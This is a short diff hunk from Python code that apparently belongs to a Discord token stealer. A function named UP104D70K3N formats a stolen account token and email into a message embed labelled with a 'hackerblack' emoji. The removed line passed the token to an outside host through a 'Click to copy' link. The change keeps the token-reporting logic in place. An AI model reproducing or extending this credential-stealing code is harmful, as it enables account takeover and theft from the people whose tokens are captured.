@@ -461,7 +461,7 @@ def UP104D70K3N(token, path):
             "fields": [
                 {
                     "name": "<:hackerblack:1095747410539593800> Token:",
-                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
+                    "value": f"`{token}`"
                 },
                 {
                     "name": "<:mail:1095741024678191114> Email:",
